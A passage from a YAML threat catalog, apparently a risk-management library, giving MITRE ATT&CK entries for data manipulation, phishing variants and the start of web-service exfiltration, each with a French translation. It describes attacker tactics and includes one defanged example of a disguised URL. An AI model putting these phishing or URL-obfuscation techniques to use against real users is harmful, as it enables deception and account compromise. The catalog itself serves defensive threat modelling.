          \ donn\xE9es afin d\u2019influencer les r\xE9sultats externes ou de dissimuler\
          \ une activit\xE9, mena\xE7ant ainsi l\u2019int\xE9grit\xE9 des donn\xE9\
          es. (Citation : Sygnia Elephant Beetle janvier 2022) En manipulant les donn\xE9\
          es, les adversaires peuvent tenter d\u2019influencer un processus m\xE9\
          tier, une compr\xE9hension organisationnelle ou une prise de d\xE9cision.\n\
          \nLe type de modification et l\u2019impact qu\u2019elle aura d\xE9pendent\
          \ de l\u2019application et du processus cibl\xE9s ainsi que des buts et\
          \ objectifs de l\u2019adversaire. Pour les syst\xE8mes complexes, un adversaire\
          \ aurait probablement besoin d\u2019une expertise particuli\xE8re et \xE9\
          ventuellement d\u2019un acc\xE8s \xE0 des logiciels sp\xE9cialis\xE9s li\xE9\
          s au syst\xE8me, qui seraient g\xE9n\xE9ralement obtenus via une campagne\
          \ prolong\xE9e de collecte d\u2019informations afin d\u2019avoir l\u2019\
          impact d\xE9sir\xE9.\nhttps://attack.mitre.org/techniques/T1565"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.001
    ref_id: T1565.001
    name: Stored Data Manipulation
    description: 'Adversaries may insert, delete, or manipulate data at rest in order
      to influence external outcomes or hide activity, thus threatening the integrity
      of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018)
      By manipulating stored data, adversaries may attempt to affect a business process,
      organizational understanding, and decision making.


      Stored data could include a variety of file formats, such as Office files, databases,
      stored emails, and custom file formats. The type of modification and the impact
      it will have depends on the type of data as well as the goals and objectives
      of the adversary. For complex systems, an adversary would likely need special
      expertise and possibly access to specialized software related to the system
      that would typically be gained through a prolonged information gathering campaign
      in order to have the desired impact.

      https://attack.mitre.org/techniques/T1565/001'
    translations:
      fr:
        name: "Manipulation des donn\xE9es stock\xE9es"
        description: "Les adversaires peuvent ins\xE9rer, supprimer ou manipuler des\
          \ donn\xE9es au repos afin d\u2019influencer les r\xE9sultats externes ou\
          \ de dissimuler une activit\xE9, mena\xE7ant ainsi l\u2019int\xE9grit\xE9\
          \ des donn\xE9es. (Citation : FireEye APT38 oct. 2018)(Citation : DOJ Lazarus\
          \ Sony 2018) En manipulant les donn\xE9es stock\xE9es, les adversaires peuvent\
          \ tenter d\u2019influencer un processus m\xE9tier, la compr\xE9hension organisationnelle\
          \ et la prise de d\xE9cision.\n\nLes donn\xE9es stock\xE9es peuvent inclure\
          \ une vari\xE9t\xE9 de formats de fichiers, tels que des fichiers Office,\
          \ des bases de donn\xE9es, des emails stock\xE9s et des formats de fichiers\
          \ personnalis\xE9s. Le type de modification et l\u2019impact qu\u2019elle\
          \ aura d\xE9pendent du type de donn\xE9es ainsi que des buts et objectifs\
          \ de l\u2019adversaire. Pour les syst\xE8mes complexes, un adversaire aurait\
          \ probablement besoin d\u2019une expertise particuli\xE8re et \xE9ventuellement\
          \ d\u2019un acc\xE8s \xE0 des logiciels sp\xE9cialis\xE9s li\xE9s au syst\xE8\
          me, qui seraient g\xE9n\xE9ralement obtenus via une campagne prolong\xE9\
          e de collecte d\u2019informations afin d\u2019avoir l\u2019impact d\xE9\
          sir\xE9.\nhttps://attack.mitre.org/techniques/T1565/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.002
    ref_id: T1565.002
    name: Transmitted Data Manipulation
    description: 'Adversaries may alter data en route to storage or other systems
      in order to manipulate external outcomes or hide activity, thus threatening
      the integrity of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus
      Sony 2018) By manipulating transmitted data, adversaries may attempt to affect
      a business process, organizational understanding, and decision making.


      Manipulation may be possible over a network connection or between system processes
      where there is an opportunity deploy a tool that will intercept and change information.
      The type of modification and the impact it will have depends on the target transmission
      mechanism as well as the goals and objectives of the adversary. For complex
      systems, an adversary would likely need special expertise and possibly access
      to specialized software related to the system that would typically be gained
      through a prolonged information gathering campaign in order to have the desired
      impact.

      https://attack.mitre.org/techniques/T1565/002'
    translations:
      fr:
        name: "Manipulation des donn\xE9es transmises"
        description: "Les adversaires peuvent modifier les donn\xE9es en route vers\
          \ le stockage ou d\u2019autres syst\xE8mes afin de manipuler des r\xE9sultats\
          \ externes ou de dissimuler une activit\xE9, mena\xE7ant ainsi l\u2019int\xE9\
          grit\xE9 des donn\xE9es. (Citation : FireEye APT38 oct. 2018)(Citation :\
          \ DOJ Lazarus Sony 2018) En manipulant les donn\xE9es transmises, les adversaires\
          \ peuvent tenter d\u2019influencer un processus m\xE9tier, la compr\xE9\
          hension organisationnelle et la prise de d\xE9cision.\n\nLa manipulation\
          \ peut \xEAtre possible via une connexion r\xE9seau ou entre processus syst\xE8\
          me lorsque la possibilit\xE9 est de d\xE9ployer un outil qui interceptera\
          \ et modifiera l\u2019information. Le type de modification et l\u2019impact\
          \ qu\u2019elle aura d\xE9pendent du m\xE9canisme de transmission de la cible\
          \ ainsi que des buts et objectifs de l\u2019adversaire. Pour les syst\xE8\
          mes complexes, un adversaire aurait probablement besoin d\u2019une expertise\
          \ particuli\xE8re et \xE9ventuellement d\u2019un acc\xE8s \xE0 des logiciels\
          \ sp\xE9cialis\xE9s li\xE9s au syst\xE8me, qui seraient g\xE9n\xE9ralement\
          \ obtenus via une campagne prolong\xE9e de collecte d\u2019informations\
          \ afin d\u2019avoir l\u2019impact d\xE9sir\xE9.\nhttps://attack.mitre.org/techniques/T1565/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1565.003
    ref_id: T1565.003
    name: Runtime Data Manipulation
    description: 'Adversaries may modify systems in order to manipulate the data as
      it is accessed and displayed to an end user, thus threatening the integrity
      of the data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018)
      By manipulating runtime data, adversaries may attempt to affect a business process,
      organizational understanding, and decision making.


      Adversaries may alter application binaries used to display data in order to
      cause runtime manipulations. Adversaries may also conduct [Change Default File
      Association](https://attack.mitre.org/techniques/T1546/001) and [Masquerading](https://attack.mitre.org/techniques/T1036)
      to cause a similar effect. The type of modification and the impact it will have
      depends on the target application and process as well as the goals and objectives
      of the adversary. For complex systems, an adversary would likely need special
      expertise and possibly access to specialized software related to the system
      that would typically be gained through a prolonged information gathering campaign
      in order to have the desired impact.

      https://attack.mitre.org/techniques/T1565/003'
    translations:
      fr:
        name: "Manipulation des donn\xE9es \xE0 l\u2019ex\xE9cution"
        description: "Les adversaires peuvent modifier les syst\xE8mes afin de manipuler\
          \ les donn\xE9es au fur et \xE0 mesure qu\u2019elles sont consult\xE9es\
          \ et affich\xE9es \xE0 un utilisateur final, mena\xE7ant ainsi l\u2019int\xE9\
          grit\xE9 des donn\xE9es. (Citation : FireEye APT38 oct. 2018)(Citation :\
          \ DOJ Lazarus Sony 2018) En manipulant les donn\xE9es \xE0 l\u2019ex\xE9\
          cution, les adversaires peuvent tenter d\u2019influencer un processus m\xE9\
          tier, la compr\xE9hension organisationnelle et la prise de d\xE9cision.\n\
          \nLes adversaires peuvent modifier les binaires d\u2019application utilis\xE9\
          s pour afficher les donn\xE9es afin de provoquer des manipulations \xE0\
          \ l\u2019ex\xE9cution. Les adversaires peuvent \xE9galement effectuer [Modifier\
          \ l\u2019Association de Fichier par d\xE9faut](https://attack.mitre.org/techniques/T1546/001)\
          \ et [Masquerading](https://attack.mitre.org/techniques/T1036) pour provoquer\
          \ un effet similaire. Le type de modification et l\u2019impact qu\u2019\
          elle aura d\xE9pendent de l\u2019application et du processus cibl\xE9s ainsi\
          \ que des buts et objectifs de l\u2019adversaire. Pour les syst\xE8mes complexes,\
          \ un adversaire aurait probablement besoin d\u2019une expertise particuli\xE8\
          re et \xE9ventuellement d\u2019un acc\xE8s \xE0 des logiciels sp\xE9cialis\xE9\
          s li\xE9s au syst\xE8me, qui seraient g\xE9n\xE9ralement obtenus via une\
          \ campagne prolong\xE9e de collecte d\u2019informations afin d\u2019avoir\
          \ l\u2019impact d\xE9sir\xE9.\nhttps://attack.mitre.org/techniques/T1565/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566
    ref_id: T1566
    name: Phishing
    description: 'Adversaries may send phishing messages to gain access to victim
      systems. All forms of phishing are electronically delivered social engineering.
      Phishing can be targeted, known as spearphishing. In spearphishing, a specific
      individual, company, or industry will be targeted by the adversary. More generally,
      adversaries can conduct non-targeted phishing, such as in mass malware spam
      campaigns.


      Adversaries may send victims emails containing malicious attachments or links,
      typically to execute malicious code on victim systems. Phishing may also be
      conducted via third-party services, like social media platforms. Phishing may
      also involve social engineering techniques, such as posing as a trusted source,
      as well as evasive techniques such as removing or manipulating emails or metadata/headers
      from compromised accounts being abused to send messages (e.g., [Email Hiding
      Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation: Microsoft
      OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014) Another way
      to accomplish this is by [Email Spoofing](https://attack.mitre.org/techniques/T1684/002)(Citation:
      Proofpoint-spoof) the identity of the sender, which can be used to fool both
      the human recipient as well as automated security tools,(Citation: cyberproof-double-bounce)
      or by including the intended target as a party to an existing email thread that
      includes malicious files or links (i.e., "thread hijacking").(Citation: phishing-krebs)


      Victims may also receive phishing messages that instruct them to call a phone
      number where they are directed to visit a malicious URL, download malware,(Citation:
      sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software)
      or install adversary-accessible remote management tools onto their computer
      (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation:
      Unit42 Luna Moth)

      https://attack.mitre.org/techniques/T1566'
    translations:
      fr:
        name: "Hame\xE7onnage"
        description: "Les adversaires peuvent envoyer des messages de phishing pour\
          \ acc\xE9der aux syst\xE8mes des victimes. Toutes les formes de phishing\
          \ sont livr\xE9es \xE9lectroniquement par ing\xE9nierie sociale. Le phishing\
          \ peut \xEAtre cibl\xE9, appel\xE9 spearphishing. Dans le spearphishing,\
          \ une personne, une entreprise ou un secteur sp\xE9cifique sera cibl\xE9\
          \ par l\u2019adversaire. Plus g\xE9n\xE9ralement, les adversaires peuvent\
          \ mener des campagnes de phishing non cibl\xE9es, comme dans les campagnes\
          \ massives de spam de malwares.\n\nLes adversaires peuvent envoyer aux victimes\
          \ des courriels contenant des pi\xE8ces jointes ou des liens malveillants,\
          \ g\xE9n\xE9ralement pour ex\xE9cuter du code malveillant sur les syst\xE8\
          mes victimes. Le phishing peut \xE9galement \xEAtre men\xE9 via des services\
          \ tiers, comme les plateformes de r\xE9seaux sociaux. Le phishing peut \xE9\
          galement impliquer des techniques d\u2019ing\xE9nierie sociale, comme se\
          \ faire passer pour une source fiable, ainsi que des techniques d\u2019\xE9\
          vasion telles que supprimer ou manipuler des emails ou des m\xE9tadonn\xE9\
          es/en-t\xEAtes provenant de comptes compromis abus\xE9s pour envoyer des\
          \ messages (par exemple, [R\xE8gles de dissimulation des e-mails](https://attack.mitre.org/techniques/T1564/008)).\
          \ (Citation : Microsoft OAuth Spam 2022)(Citation : Palo Alto Unit 42 VBA\
          \ Infostealer 2014) Une autre fa\xE7on d\u2019y parvenir est de [Spoofing\
          \ par email](https://attack.mitre.org/techniques/T1684/002)(Citation : Proofpoint-spoof)\
          \ l\u2019identit\xE9 de l\u2019exp\xE9diteur, qui peut \xEAtre utilis\xE9\
          e pour tromper \xE0 la fois le destinataire humain et les outils de s\xE9\
          curit\xE9 automatis\xE9s, (Citation : cyberproof-double-bounce) ou en incluant\
          \ la cible vis\xE9e comme partie \xE0 un fil de diffusion existant incluant\
          \ des fichiers ou des liens malveillants (c\u2019est-\xE0-dire :  \xAB d\xE9\
          tournement de filetage \xBB). (Citation : phishing-krebs)\n\nLes victimes\
          \ peuvent \xE9galement recevoir des messages de phishing leur demandant\
          \ d\u2019appeler un num\xE9ro de t\xE9l\xE9phone pour leur demander de consulter\
          \ une URL malveillante, de t\xE9l\xE9charger un logiciel malveillant (Citation\
          \ : sygnia Luna Month) (Citation : CISA Remote Monitoring and Management\
          \ Software) ou d\u2019installer des outils de gestion \xE0 distance accessibles\
          \ aux adversaires sur leur ordinateur (c\u2019est-\xE0-dire [User Execution](https://attack.mitre.org/techniques/T1204)).\
          \ (Citation : Unit\xE942 Luna Moth)\nhttps://attack.mitre.org/techniques/T1566"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.001
    ref_id: T1566.001
    name: Spearphishing Attachment
    description: 'Adversaries may send spearphishing emails with a malicious attachment
      in an attempt to gain access to victim systems. Spearphishing attachment is
      a specific variant of spearphishing. Spearphishing attachment is different from
      other forms of spearphishing in that it employs the use of malware attached
      to an email. All forms of spearphishing are electronically delivered social
      engineering targeted at a specific individual, company, or industry. In this
      scenario, adversaries attach a file to the spearphishing email and usually rely
      upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.(Citation:
      Unit 42 DarkHydrus July 2018) Spearphishing may also involve social engineering
      techniques, such as posing as a trusted source.


      There are many options for the attachment such as Microsoft Office documents,
      executables, PDFs, or archived files. Upon opening the attachment (and potentially
      clicking past protections), the adversary''s payload exploits a vulnerability
      or directly executes on the user''s system. The text of the spearphishing email
      usually tries to give a plausible reason why the file should be opened, and
      may explain how to bypass system protections in order to do so. The email may
      also contain instructions on how to decrypt an attachment, such as a zip file
      password, in order to evade email boundary defenses. Adversaries frequently
      manipulate file extensions and icons in order to make attached executables appear
      to be document files, or files exploiting one application appear to be a file
      for a different one.

      https://attack.mitre.org/techniques/T1566/001'
    translations:
      fr:
        name: "Pi\xE8ce jointe Spearphishing"
        description: "Les adversaires peuvent envoyer des courriels de spearphishing\
          \ avec une pi\xE8ce jointe malveillante dans le but d\u2019acc\xE9der aux\
          \ syst\xE8mes victimes. L\u2019accessoire Spearphishing est une variante\
          \ sp\xE9cifique du spearphishing. L\u2019annexe de spearphishing se distingue\
          \ des autres formes de spearphishing en ce qu\u2019elle utilise des logiciels\
          \ malveillants attach\xE9s \xE0 un e-mail. Toutes les formes de spearphishing\
          \ sont des ing\xE9nieries sociales \xE9lectroniques ciblant un individu,\
          \ une entreprise ou un secteur sp\xE9cifique. Dans ce sc\xE9nario, les adversaires\
          \ associent un fichier \xE0 l\u2019email de spearphishing et comptent g\xE9\
          n\xE9ralement sur [User Execution](https://attack.mitre.org/techniques/T1204)\
          \ pour obtenir leur ex\xE9cution. (Citation : Unit\xE9 42 DarkHydrus, juillet\
          \ 2018) Le spearphishing peut \xE9galement impliquer des techniques d\u2019\
          ing\xE9nierie sociale, comme se faire passer pour une source fiable.\n\n\
          Il existe de nombreuses options pour la pi\xE8ce jointe telles que des documents\
          \ Microsoft Office, des ex\xE9cutables, des PDF ou des fichiers archiv\xE9\
          s. En ouvrant la pi\xE8ce jointe (et potentiellement en cliquant au-del\xE0\
          \ des protections), la charge utile de l\u2019adversaire exploite une vuln\xE9\
          rabilit\xE9 ou s\u2019ex\xE9cute directement sur le syst\xE8me de l\u2019\
          utilisateur. Le texte de l\u2019email de spearphishing tente g\xE9n\xE9\
          ralement de donner une raison plausible pour laquelle le fichier devrait\
          \ \xEAtre ouvert, et peut expliquer comment contourner les protections syst\xE8\
          me pour y parvenir. L\u2019email peut \xE9galement contenir des instructions\
          \ sur la mani\xE8re de d\xE9chiffrer une pi\xE8ce jointe, comme un mot de\
          \ passe de fichier zip, afin d\u2019\xE9viter les d\xE9fenses des limites\
          \ de l\u2019email. Les adversaires manipulent fr\xE9quemment des extensions\
          \ de fichiers et des ic\xF4nes afin de faire para\xEEtre les ex\xE9cutables\
          \ joints comme des fichiers documents, ou les fichiers exploitant une application\
          \ comme un fichier pour une autre.\nhttps://attack.mitre.org/techniques/T1566/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.002
    ref_id: T1566.002
    name: Spearphishing Link
    description: "Adversaries may send spearphishing emails with a malicious link\
      \ in an attempt to gain access to victim systems. Spearphishing with a link\
      \ is a specific variant of spearphishing. It is different from other forms of\
      \ spearphishing in that it employs the use of links to download malware contained\
      \ in email, instead of attaching malicious files to the email itself, to avoid\
      \ defenses that may inspect email attachments. Spearphishing may also involve\
      \ social engineering techniques, such as posing as a trusted source.\n\nAll\
      \ forms of spearphishing are electronically delivered social engineering targeted\
      \ at a specific individual, company, or industry. In this case, the malicious\
      \ emails contain links. Generally, the links will be accompanied by social engineering\
      \ text and require the user to actively click or copy and paste a URL into a\
      \ browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204).\
      \ The visited website may compromise the web browser using an exploit, or the\
      \ user will be prompted to download applications, documents, zip files, or even\
      \ executables depending on the pretext for the email in the first place.\n\n\
      Adversaries may also include links that are intended to interact directly with\
      \ an email reader, including embedded images intended to exploit the end system\
      \ directly. Additionally, adversaries may use seemingly benign links that abuse\
      \ special characters to mimic legitimate websites (known as an \"IDN homograph\
      \ attack\").(Citation: CISA IDN ST05-016) URLs may also be obfuscated by taking\
      \ advantage of quirks in the URL schema, such as the acceptance of integer-\
      \ or hexadecimal-based hostname formats and the automatic discarding of text\
      \ before an \u201C@\u201D symbol: for example, `hxxp://google.com@1157586937`.(Citation:\
      \ Mandiant URL Obfuscation 2023)\n\nAdversaries may also utilize links to perform\
      \ consent phishing/spearphishing campaigns to [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s\
      \ that grant immediate access to the victim environment. For example, a user\
      \ may be lured into granting adversaries permissions/access via a malicious\
      \ OAuth 2.0 request URL that when accepted by the user provide permissions/access\
      \ for malicious applications.(Citation: Trend Micro Pawn Storm OAuth 2017)(Citation:\
      \ Microsoft OAuth 2.0 Consent Phishing 2021) These stolen access tokens allow\
      \ the adversary to perform various actions on behalf of the user via API calls.(Citation:\
      \ Microsoft OAuth 2.0 Consent Phishing 2021)\n\nSimilarly, malicious links may\
      \ also target device-based authorization, such as OAuth 2.0 device authorization\
      \ grant flow which is typically used to authenticate devices without UIs/browsers.\
      \ Known as \u201Cdevice code phishing,\u201D an adversary may send a link that\
      \ directs the victim to a malicious authorization page where the user is tricked\
      \ into entering a code/credentials that produces a device token.(Citation: SecureWorks\
      \ Device Code Phishing 2021)(Citation: Netskope Device Code Phishing 2021)(Citation:\
      \ Optiv Device Code Phishing 2021)\nhttps://attack.mitre.org/techniques/T1566/002"
    translations:
      fr:
        name: Lien Spearphishing
        description: "Les attaquants peuvent envoyer des e-mails de spearphishing\
          \ contenant un lien malveillant afin de tenter d'acc\xE9der aux syst\xE8\
          mes des victimes. Le spearphishing par lien est une variante sp\xE9cifique\
          \ du spearphishing. Il se distingue des autres formes de spearphishing en\
          \ ce qu'il utilise des liens pour t\xE9l\xE9charger des logiciels malveillants\
          \ contenus dans l'e-mail, plut\xF4t que de joindre des fichiers malveillants\
          \ \xE0 l'e-mail lui-m\xEAme, afin de contourner les syst\xE8mes de d\xE9\
          fense susceptibles d'inspecter les pi\xE8ces jointes. Le spearphishing peut\
          \ \xE9galement faire appel \xE0 des techniques d\u2019ing\xE9nierie sociale,\
          \ comme le fait de se faire passer pour une source de confiance.\n\nToutes\
          \ les formes de spearphishing constituent des techniques d\u2019ing\xE9\
          nierie sociale transmises par voie \xE9lectronique et ciblant une personne,\
          \ une entreprise ou un secteur d\u2019activit\xE9 sp\xE9cifique. Dans ce\
          \ cas pr\xE9cis, les e-mails malveillants contiennent des liens. En g\xE9\
          n\xE9ral, ces liens sont accompagn\xE9s d\u2019un texte d\u2019ing\xE9nierie\
          \ sociale et exigent que l\u2019utilisateur clique activement ou copie-colle\
          \ une URL dans un navigateur, exploitant ainsi l\u2019\xAB ex\xE9cution\
          \ par l\u2019utilisateur \xBB (https://attack.mitre.org/techniques/T1204).\
          \ Le site web visit\xE9 peut compromettre le navigateur web \xE0 l\u2019\
          aide d\u2019un exploit, ou l\u2019utilisateur sera invit\xE9 \xE0 t\xE9\
          l\xE9charger des applications, des documents, des fichiers zip, voire des\
          \ fichiers ex\xE9cutables, selon le pr\xE9texte initialement utilis\xE9\
          \ dans l\u2019e-mail.\n\nLes attaquants peuvent \xE9galement inclure des\
          \ liens destin\xE9s \xE0 interagir directement avec un client de messagerie,\
          \ notamment des images int\xE9gr\xE9es visant \xE0 exploiter directement\
          \ le syst\xE8me cible. De plus, ils peuvent utiliser des liens d\u2019apparence\
          \ inoffensive qui abusent de caract\xE8res sp\xE9ciaux pour imiter des sites\
          \ web l\xE9gitimes (ce que l\u2019on appelle une \xAB attaque par homographe\
          \ IDN \xBB). (R\xE9f\xE9rence : CISA IDN ST05-016) Les URL peuvent \xE9\
          galement \xEAtre obscurcies en tirant parti des particularit\xE9s du sch\xE9\
          ma des URL, telles que l\u2019acceptation de formats de noms d\u2019h\xF4\
          te bas\xE9s sur des nombres entiers ou hexad\xE9cimaux et la suppression\
          \ automatique du texte pr\xE9c\xE9dant le symbole \xAB @ \xBB : par exemple,\
          \ `hxxp://google.com@1157586937`. (R\xE9f\xE9rence : Mandiant URL Obfuscation\
          \ 2023)\n\nLes attaquants peuvent \xE9galement utiliser des liens pour mener\
          \ des campagnes de hame\xE7onnage de consentement ou de spearphishing visant\
          \ \xE0 [voler des jetons d\u2019acc\xE8s aux applications](https://attack.mitre.org/techniques/T1528)\
          \ qui leur conf\xE8rent un acc\xE8s imm\xE9diat \xE0 l\u2019environnement\
          \ de la victime. Par exemple, un utilisateur peut \xEAtre incit\xE9 \xE0\
          \ accorder des autorisations ou un acc\xE8s aux attaquants via une URL de\
          \ requ\xEAte OAuth 2.0 malveillante qui, une fois accept\xE9e par l\u2019\
          utilisateur, octroie des autorisations ou un acc\xE8s \xE0 des applications\
          \ malveillantes. (R\xE9f\xE9rence : Trend Micro Pawn Storm OAuth 2017) (R\xE9\
          f\xE9rence : Microsoft OAuth 2.0 Consent Phishing 2021) Ces jetons d\u2019\
          acc\xE8s vol\xE9s permettent \xE0 l\u2019attaquant d\u2019effectuer diverses\
          \ actions au nom de l\u2019utilisateur via des appels API. (R\xE9f\xE9rence\
          \ : Microsoft OAuth 2.0 Consent Phishing 2021)\n\nDe m\xEAme, les liens\
          \ malveillants peuvent \xE9galement cibler l\u2019autorisation bas\xE9e\
          \ sur les appareils, comme le flux d\u2019autorisation OAuth 2.0, g\xE9\
          n\xE9ralement utilis\xE9 pour authentifier des appareils d\xE9pourvus d\u2019\
          interface utilisateur ou de navigateur. Dans le cadre de ce que l\u2019\
          on appelle le \xAB phishing par code d\u2019appareil \xBB, un attaquant\
          \ peut envoyer un lien redirigeant la victime vers une page d\u2019autorisation\
          \ malveillante o\xF9 l\u2019utilisateur est incit\xE9 \xE0 saisir un code\
          \ ou des identifiants permettant de g\xE9n\xE9rer un jeton d\u2019appareil.\
          \ (R\xE9f\xE9rence : SecureWorks, \xAB Device Code Phishing 2021 \xBB) (R\xE9\
          f\xE9rence : Netskope, \xAB Device Code Phishing 2021 \xBB) (R\xE9f\xE9\
          rence : Optiv, \xAB Device Code Phishing 2021 \xBB)\nhttps://attack.mitre.org/techniques/T1566/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.003
    ref_id: T1566.003
    name: Spearphishing via Service
    description: "Adversaries may send spearphishing messages via third-party services\
      \ in an attempt to gain access to victim systems. Spearphishing via service\
      \ is a specific variant of spearphishing. It is different from other forms of\
      \ spearphishing in that it employs the use of third party services rather than\
      \ directly via enterprise email channels. \n\nAll forms of spearphishing are\
      \ electronically delivered social engineering targeted at a specific individual,\
      \ company, or industry. In this scenario, adversaries send messages through\
      \ various social media services, personal webmail, and other non-enterprise\
      \ controlled services.(Citation: Lookout Dark Caracal Jan 2018) These services\
      \ are more likely to have a less-strict security policy than an enterprise.\
      \ As with most kinds of spearphishing, the goal is to generate rapport with\
      \ the target or get the target's interest in some way. Adversaries will create\
      \ fake social media accounts and message employees for potential job opportunities.\
      \ Doing so allows a plausible reason for asking about services, policies, and\
      \ software that's running in an environment. The adversary can then send malicious\
      \ links or attachments through these services.\n\nA common example is to build\
      \ rapport with a target via social media, then send content to a personal webmail\
      \ service that the target uses on their work computer. This allows an adversary\
      \ to bypass some email restrictions on the work account, and the target is more\
      \ likely to open the file since it's something they were expecting. If the payload\
      \ doesn't work as expected, the adversary can continue normal communications\
      \ and troubleshoot with the target on how to get it working.\nhttps://attack.mitre.org/techniques/T1566/003"
    translations:
      fr:
        name: Spearphishing via Service
        description: "Les adversaires peuvent envoyer des messages de spearphishing\
          \ via des services tiers dans le but d\u2019acc\xE9der aux syst\xE8mes des\
          \ victimes. Le spearphishing via service est une variante sp\xE9cifique\
          \ du spearphishing. Il se distingue des autres formes de spearphishing en\
          \ ce qu\u2019il utilise des services tiers plut\xF4t que directement via\
          \ les canaux de messagerie d\u2019entreprise. \n\nToutes les formes de spearphishing\
          \ sont des ing\xE9nieries sociales \xE9lectroniques ciblant un individu,\
          \ une entreprise ou un secteur sp\xE9cifique. Dans ce cas, les adversaires\
          \ envoient des messages via divers services de r\xE9seaux sociaux, des webmails\
          \ personnels et d\u2019autres services non contr\xF4l\xE9s par les entreprises.\
          \ (Citation : Lookout Dark Caracal janvier 2018) Ces services ont plus souvent\
          \ une politique de s\xE9curit\xE9 moins stricte qu\u2019une entreprise.\
          \ Comme pour la plupart des types de spearphishing, l\u2019objectif est\
          \ de cr\xE9er un lien avec la cible ou d\u2019attirer son int\xE9r\xEAt\
          \ d\u2019une mani\xE8re ou d\u2019une autre. Les adversaires cr\xE9ent de\
          \ faux comptes sur les r\xE9seaux sociaux et envoient des messages aux employ\xE9\
          s pour des opportunit\xE9s d\u2019emploi potentielles. Cela donne une raison\
          \ plausible de s\u2019interroger sur les services, politiques et logiciels\
          \ qui fonctionnent dans un environnement. L\u2019adversaire peut alors envoyer\
          \ des liens ou pi\xE8ces jointes malveillantes via ces services.\n\nUn exemple\
          \ courant consiste \xE0 \xE9tablir un lien avec une cible via les r\xE9\
          seaux sociaux, puis \xE0 envoyer du contenu \xE0 un service de webmail personnel\
          \ que la cible utilise sur son ordinateur de travail. Cela permet \xE0 un\
          \ adversaire de contourner certaines restrictions d\u2019email sur le compte\
          \ professionnel, et la cible est plus susceptible d\u2019ouvrir le fichier\
          \ puisque c\u2019est quelque chose qu\u2019elle attendait. Si la charge\
          \ utile ne fonctionne pas comme pr\xE9vu, l\u2019adversaire peut poursuivre\
          \ les communications normales et d\xE9panner avec la cible pour savoir comment\
          \ la faire fonctionner.\nhttps://attack.mitre.org/techniques/T1566/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1566.004
    ref_id: T1566.004
    name: Spearphishing Voice
    description: 'Adversaries may use voice communications to ultimately gain access
      to victim systems. Spearphishing voice is a specific variant of spearphishing.
      It is different from other forms of spearphishing in that it employs the use
      of manipulating a user into providing access to systems through a phone call
      or other forms of voice communications. Spearphishing frequently involves social
      engineering techniques, such as posing as a trusted source (ex: [Impersonation](https://attack.mitre.org/techniques/T1684/001))
      and/or creating a sense of urgency or alarm for the recipient.


      All forms of phishing are electronically delivered social engineering. In this
      scenario, adversaries are not directly sending malware to a victim vice relying
      on [User Execution](https://attack.mitre.org/techniques/T1204) for delivery
      and execution. For example, victims may receive phishing messages that instruct
      them to call a phone number where they are directed to visit a malicious URL,
      download malware,(Citation: sygnia Luna Month)(Citation: CISA Remote Monitoring
      and Management Software) or install adversary-accessible remote management tools
      ([Remote Access Tools](https://attack.mitre.org/techniques/T1219)) onto their
      computer.(Citation: Unit42 Luna Moth)


      Adversaries may also combine voice phishing with [Multi-Factor Authentication
      Request Generation](https://attack.mitre.org/techniques/T1621) in order to trick
      users into divulging MFA credentials or accepting authentication prompts.(Citation:
      Proofpoint Vishing)

      https://attack.mitre.org/techniques/T1566/004'
    translations:
      fr:
        name: Voix de spearphishing
        description: "Les adversaires peuvent utiliser les communications vocales\
          \ pour finalement acc\xE9der aux syst\xE8mes des victimes. Le spearphishing\
          \ vocal est une variante sp\xE9cifique du spearphishing. Il se distingue\
          \ des autres formes de spearphishing en ce qu\u2019il utilise l\u2019utilisation\
          \ de la manipulation d\u2019un utilisateur pour qu\u2019il fournisse un\
          \ acc\xE8s aux syst\xE8mes via un appel t\xE9l\xE9phonique ou d\u2019autres\
          \ formes de communication vocale. Le spearphishing implique fr\xE9quemment\
          \ des techniques d\u2019ing\xE9nierie sociale, telles que se faire passer\
          \ pour une source fiable (ex : [Usurpation d\u2019identit\xE9](https://attack.mitre.org/techniques/T1684/001))\
          \ et/ou cr\xE9er un sentiment d\u2019urgence ou d\u2019alarme chez le destinataire.\n\
          \nToutes les formes de phishing sont livr\xE9es \xE9lectroniquement par\
          \ ing\xE9nierie sociale. Dans ce sc\xE9nario, les adversaires n\u2019envoient\
          \ pas directement des malwares \xE0 une victime, au lieu de compter sur\
          \ [User Execution](https://attack.mitre.org/techniques/T1204) pour la livraison\
          \ et l\u2019ex\xE9cution. Par exemple, les victimes peuvent recevoir des\
          \ messages de phishing leur demandant d\u2019appeler un num\xE9ro de t\xE9\
          l\xE9phone o\xF9 elles sont dirig\xE9es vers une URL malveillante, t\xE9\
          l\xE9charger un logiciel malveillant (Citation : sygnia Luna Month) (Citation\
          \ : CISA Remote Monitoring and Management Software) ou installer des outils\
          \ de gestion \xE0 distance accessibles aux adversaires ([Remote Access Tools](https://attack.mitre.org/techniques/T1219))\
          \ sur leur ordinateur. (Citation : Unit\xE942 Luna Moth)\n\nLes adversaires\
          \ peuvent \xE9galement combiner le phishing vocal avec la [g\xE9n\xE9ration\
          \ de requ\xEAtes d\u2019authentification multi-facteurs](https://attack.mitre.org/techniques/T1621)\
          \ afin de tromper les utilisateurs afin qu\u2019ils divulguent des identifiants\
          \ MFA ou acceptent les invites d\u2019authentification. (Citation : Proofpoint\
          \ Vishing)\nhttps://attack.mitre.org/techniques/T1566/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1567
    ref_id: T1567
    name: Exfiltration Over Web Service
    description: 'Adversaries may use an existing, legitimate external Web service
      to exfiltrate data rather than their primary command and control channel. Popular
